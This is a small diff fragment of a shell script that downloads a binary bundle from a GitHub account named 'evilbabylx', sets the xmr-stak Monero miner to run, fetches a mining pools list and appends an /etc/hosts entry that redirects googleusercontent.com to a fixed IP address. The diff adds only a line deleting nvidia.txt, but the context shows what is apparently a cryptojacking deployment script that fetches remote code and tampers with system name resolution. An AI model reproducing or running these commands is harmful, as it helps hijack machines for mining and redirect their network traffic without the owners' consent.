@@ -3,6 +3,7 @@ wget https://github.com/evilbabylx/script/raw/master/bin.zip
 unzip bin.zip
 chmod +x xmr-stak
 rm pools.txt
+rm nvidia.txt
 wget https://raw.githubusercontent.com/evilbabylx/script/master/configazi/pools.txt
 sh -c "echo '216.244.80.11  googleusercontent.com' >> /etc/hosts"
 
